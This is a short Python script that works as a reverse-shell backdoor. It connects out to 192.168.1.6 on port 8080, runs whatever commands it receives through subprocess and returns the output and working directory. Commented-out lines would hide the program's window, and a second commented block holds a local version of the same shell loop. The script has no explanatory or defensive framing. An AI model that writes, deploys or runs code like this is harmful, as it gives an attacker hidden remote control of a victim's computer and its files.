# from win32con import SW_HIDE
# import win32gui

# def hidden():
#     pid = win32gui.GetForegroundWindow()
#     win32gui.ShowWindow(pid , SW_HIDE)

# hidden()

from os import chdir, getcwd
from time import sleep
import socket
import subprocess


sock = socket.socket(socket.AF_INET , socket.SOCK_STREAM)

sock.connect(("192.168.1.6" , 8080))

while True:
 data = "ok !!"
 command = sock.recv(9999).decode()
 print(command)
 if command == b"exit":
        sock.close()
        break
 
 masirh = getcwd()
 def cd() :
   global masirh
   global command
   global data
   if command == None :
       pass
   elif "cd.." in command or "cd .." in command :
       command = ".."
       chdir(command)
       masirh = getcwd()

   elif "cd " in command[0:4]:
    l = command[3:]
    s = chdir(masirh+"\\"+l)
    masirh = getcwd()


 
 if "cd" in command[0:4]:
     cd()
 else :
    data = subprocess.getoutput(command)

 sock.send(data.encode())
 sleep(0.5)
 sock.send(masirh.encode())


# import os
# import subprocess
# while True:
 
#  masirh = os.getcwd()
#  v = input(masirh + " :>> ")
#  def cd() :
#    global v
#    if v == None :
#        pass
#    elif "cd.." in v or "cd .." in v :
#        v = ".."
#        os.chdir(v)

#    elif "cd " in v[0:4]:
#     l = v[3:]
#     s = os.chdir(masirh+"\\"+l)


 
#  if "cd" in command[0:4]:
#      cd()
#  else :
#     a = subprocess.getoutput(command)
#     print (a)

 
